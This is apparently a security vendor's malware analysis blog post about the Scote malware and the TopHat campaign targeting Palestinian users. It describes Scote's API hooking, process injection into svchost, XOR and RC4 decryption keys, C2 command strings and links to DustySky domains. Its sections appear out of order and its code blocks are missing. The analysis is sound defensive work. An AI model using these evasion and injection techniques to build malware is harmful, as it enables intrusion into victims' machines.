Based on the observed statistics from the malicious redirect found in technique #1, as well as the content of this decoy document, we can infer that at least some of the targeted victims may very well be located in the Palestinian Territories.<br />
<span style="font-size: 18pt;"><br />
Analysis of the Scote Malware</span><br />
The Scote malware family employs a series of techniques and tricks when it is originally loaded onto a victim machine. However, underneath the various layers of obfuscation lies a fairly straightforward malware family that abuses legitimate third-party online services to host its C2 information.<br />
When Scote originally is run, it will decode embedded configuration information. This embedded configuration information contains URLs to third party online services, such as Pastebin postings or Google+ accounts. Scote will use this information to attempt to retrieve data from these URLS and parse it, such as in the following example:<br />
<img class="aligncenter wp-image-59218" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_6.png" alt="tophat_6" width="600" height="374" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_6.png 973w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_6-900x561.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_6-300x187.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_6-768x479.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_6-370x231.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 6 Google+ profile used by Scote malware</em></p>
<p>It should be noted that a total of three Google+ profiles have been observed and all of these profiles contained the name ‘Donald Trump’. This is interesting given the topics we saw being used to deliver the Scote malware family within the TopHat campaign, many of which also referred to the President of the Palestinian Territories.<br />
After C2 information is retrieved by Scote, it will communicate with these servers and can accept commands that perform the following actions:</p>
<ul>
<li>Kill the Scote malware</li>
<li>Run ‘ipconfig’ on the victim and return results</li>
<li>Run ‘cmd.exe /C systeminfo’ and return results</li>
<li>Load a DLL that is downloaded from a C2</li>
</ul>

Identified Malware Testing Against Security Solutions</span><br />
When looking at the malicious RTF documents in technique #4 that exploit CVE-2017-0199 we found that all of the files we encountered were submitted within close succession of each other to an online service that tests them against multiple security products. Additionally, the original filenames of these files implied that an attacker may have been testing their malware against one or more security products.</p>

<p style="text-align: center;"><em>Figure 7 Modifications made to RTFs by attacker</em></p>
<p>As it so happens, the first RTF file this attacker attempted to test had very few detections. However, this was due to the fact that the attempts at commenting out the backslashes caused this file to not open at all within Microsoft Word. When you attempt to open this file, Word will simply render the content as it would a normal text file.<br />
It appeared that the attacker realized this, as he or she quickly corrected this, and proceeded to make very minor modifications to try and evade security products. However, none of the modifications were terribly effective: all of these samples were found to have a high rate of detection.<br />
As we can see in Figure 7, the attacker made multiple very small modifications between each iteration, specifically around the ‘\object\objlink\objupdate’ string. This particular control allows the malicious content to be loaded by the RTF, as outlined in an analysis by <a href="https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/">MDSec</a>. As such, the attacker likely felt this was what resulted in the RTF being detected as malicious, and attempted to obfuscated it.<br />
<span style="font-size: 18pt;"><br />
Overlap with the DustySky Campaign</span><br />
Besides being able to witness the attacker testing his or her malware, we noticed something interesting when we were looking at the individual who submitted these files. About a month and a half after these files were submitted, the same individual submitted the following three samples that we attribute to the <a href="http://www.clearskysec.com/dustysky/">DustySky</a> campaign:</p>
<ul>

<p>DustySky is a campaign published by ClearSky in January 2016 that discusses a politically motivated group that primarily targets organizations within the Middle East. The group has remained active since they were originally reported on, including a campaign identified by Unit 42 <a href="https://researchcenter.paloaltonetworks.com/2017/01/unit42-downeks-and-quasar-rat-used-in-recent-targeted-attacks-against-governments/">earlier this year</a>. These files appear to be new variants of the DustySky Core malware discussed in the report and they communicate with the following domains over HTTPS:</p>
<ul>
<li>fulltext.yourtrap[.]com</li>
<li>checktest.www1[.]biz</li>
</ul>
<p>The malware is dropped via a self-extracting executable, which contains an empty decoy document with the following name:</p>
<ul>
<li>انباء عن احتجاز الرئيس عباس في السعودية واعلان دحلان رئيسا لفلسطين.docx</li>
</ul>
<p>This can roughly be translated to the following:</p>
<ul>
<li>News of the detention of President Abbas in Saudi Arabia and Dahlan&#8217;s declaration as President of Palestine.docx</li>
</ul>
<p>As we can see, the name of this decoy document is consistent with the lures witnessed in the TopHat campaign.<br />

Conclusion<br />
</span><br />
Attackers often are found to leverage current events to accomplish their goal. In the TopHat campaign, we have observed yet another instance where a threat actor looks to be using political events to target individuals or organizations within the Palestine region. This campaign leveraged multiple methods to deploy a previously unseen malware family, including some relatively new tactics in the case of using a legitimate BMP file to load malicious shellcode.<br />
The new malware family, which we have dubbed Scote, employs various tricks and tactics to evade detection, but provides relatively little functionality to the attackers once deployed. This may well be due to the fact it is still under active development. Scote uses some interesting methods when retrieving C2 information, including the use of Pastebin and Google+ accounts, as well as using bit.ly links to obscure the C2 URLs so victims could not evaluate the legitimacy of the final site prior to clicking it.<br />
The TopHat campaign was found to have some overlaps discovered with the previously reported DustySky campaign when the attacker was identified to be submitting their files for testing purposes. Unit 42 will continue to track and monitor this threat and will report on any developments that occur.<br />
Palo Alto Networks customers are protected by this threat in the following ways:</p>
<ul>
<li>The <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Scote">Scote</a> malware family and the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.TopHat">TopHat</a> campaign have been tagged within AutoFocus for continued tracking</li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.DustySky">DustySky</a> is tagged within AutoFocus for ongoing tracking</li>
<li>All malicious domains discovered within this campaign have been appropriately flagged as malware</li>
<li>All samples are marked malicious within WildFire</li>
<li>Traps identifies and blocks the exploits used by the RTF files</li>
</ul>
<p>Additionally, Google, Pastebin, and bit.ly have been notified of the malicious content being hosted on their services.</p>

<p>&nbsp;<br />
For those unfamiliar with SFX commands, the series of commands above is silently deploying e.exe to the startup path. It will overwrite any instances where e.exe already exists in this path.<br />
The ‘e.exe’ file is compiled in Delphi and has the following SHA256 hash:</p>
<table align="center">
<tbody>
<tr>
<td width="72">SHA256</td>
<td width="395">9580d15a06cd59c01c59bca81fa0ca8229f410b264a38538453f7d97bfb315e7</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
When run, ‘e.exe’ will periodically decrypt strings at runtime using a simple single-byte XOR routine. While the routine allows for different bytes to be used, the author chose to use a key of 0xFF in every observed instance.<br />
The malware proceeds to get the address of the NtDelayExecution function from ntdll.dll. This function is used by Sleep to cause a delay in program execution. After this function address has been resolved, it will overwrite the first five bytes to jmp to a malicious function, as seen below:<br />
<img class="alignnone size-full wp-image-59296 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_8.png" alt="tophat_8" width="600" height="168" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_8.png 683w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_8-300x84.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_8-370x103.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 8 Modifications to NtDelayExeuction</em></p>
<p>&nbsp;<br />
The malware proceeds to make a call to Sleep with an argument of 1, thus redirecting execution to this malicious function. This is likely an attempt at thwarting anti-virus and security solutions, however, has the adverse effect of preventing the malware from making subsequent calls to Sleep.<br />
This malicious function continues to decode more strings using the single-byte XOR technique. Additionally, it will copy the following functions out of ntdll.dll for later use:</p>
<ul>
<li>ZwCreateUserProcess</li>
<li>ZwAllocateVirtualMemory</li>
<li>ZwWriteVirtualMemory</li>
<li>ZwGetContextThread</li>
<li>ZwSetContextThread</li>
<li>ZwResumeThread</li>
</ul>
<p>A large blob of encrypted data is decrypted using a modified version of RC4. The following Python code may be used to decrypt this data. The key has consistently been observed to be “qlNwuFVA9K8HpGNY6x0I”.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

This decrypted code is then copied to a newly allocated block of memory before execution flow is redirected to it. When this newly decrypted code is called, it is provided with a string argument containing the path to svchost.exe.<br />
This new code is shellcode that will eventually decrypt an executable file and inject it into a newly spawned svchost.exe process.<br />
The shellcode in question makes certain decisions by the author that demonstrates a lack of sophistication. For example, it will load a series of libraries and functions using a common ROR13 technique. This technique begins with the attacker taking a string of a library or function, such as ‘CreateProcessA’, and performing a binary ROR13 against it. In this example, the attacker has a result of a DWORD of 0x16B3FE72. This DWORD is then typically hardcoded within the shellcode. The malicious code then iterates through the functions of the necessary library and applies the same ROR13 technique against each function until it finds a match.<br />
This shellcode uses the same approach, however, instead of providing the hardcoded DWORDs, it instead provides the clear-text library and function names, which then have the ROR13 applied. The resulting DWORD is then used. Unfortunately, this completely cancels out any obfuscation that might have originally been present.<br />
After the various libraries and functions are loaded, the shellcode decodes an embedded blob of data using a multi-byte XOR operation. The original key for this operation appears to have been ‘Houdini’, however, due to a likely mistake by the author, after the first iteration, a key of ‘oudini\x00’ is used instead.<br />
The following example Python code decodes this data found within the shellcode:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

This decoded blob is a Microsoft Windows executable that contains the Scote payload. After this blob is decoded, a new instance of svchost.exe is spawned in a suspended state. The Scote payload is injected into this process prior to resuming it.<br />
Scote begins by loading and decoding an embedded resource string. It is decoded first using base64 with a customized alphabet. The result is then base64-decoded using the traditional alphabet. The following alphabet is used for the first phase of decoding:</p>
<ul>
<li>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/</li>
</ul>
<p>Once decoded, we’re provided with the following configuration (newlines and spacing added for presentation):</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

This information is used for subsequent communication and these values represent the Scote malware’s C2.<br />
While there are a number of other configuration parameters within Scote, the connection params and the nick_name appear to be the only ones used. It’s possible that Scote is still actively being developed and the author has yet to make use of the additional parameters provided within the configuration. A full list of identified Scote configurations may be found within the ‘Scote Configurations’ appendix.<br />
Scote checks the current running process against the following list to ensure it is running within one of them:</p>
<ul>
<li>svchost.exe</li>
<li>explorer.exe</li>
<li>chrome.exe</li>
<li>firefox.exe</li>
<li>iexplorer.exe</li>
<li>opera.exe</li>
</ul>
<p>Scote makes an ASM call to CPUID with an argument of 1 to query the victim’s processor information and features. This information is used to generate a unique 8-character hash for that victim.<br />
Scote then connects to the previously retrieved C2 servers and sends the following information via TCP:<br />
<span style="font-family: 'courier new', courier, monospace;">command=scote_connection|hwid=[8 character hash]</span><br />
In the example above, [8 character hash] is replaced with the victim’s unique hash. Scote continues to submit the following command periodically and will parse the response:<br />
<span style="font-family: 'courier new', courier, monospace;">command=scote_ping</span><br />
Scote accepts the following five responses:</p>
<table align="center">
<tbody>
<tr>
<td width="125"><strong>Command</strong></td>
<td width="343"><strong>Description</strong></td>
</tr>
<tr>
<td width="125">scote_pong</td>
<td width="343">No action taken by Scote</td>
</tr>
<tr>
<td width="125">scote_drop</td>
<td width="343">Kill the Scote malware</td>
</tr>
<tr>
<td width="125">scote_info_ipconfig</td>
<td width="343">Return the results of running ‘ipconfig’</td>
</tr>
<tr>
<td width="125">scote_info_systeminfo</td>
<td width="343">Return the results of running ‘cmd.exe /C systeminfo’</td>

<tr>
<td width="125">scote_upgrade</td>
<td width="343">Accept a DLL from the remote C2 and load it.</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
When Scote returns information in the following format:<br />
<span style="font-family: 'courier new', courier, monospace;">command=[command]|buffer=[data]</span><br />
In the example above, [command] is replaced with the command received by the remote C2 server, and [data] is replaced with data that has been encoded using both traditional base64 as well as base64 with the nonstandard alphabet.<br />
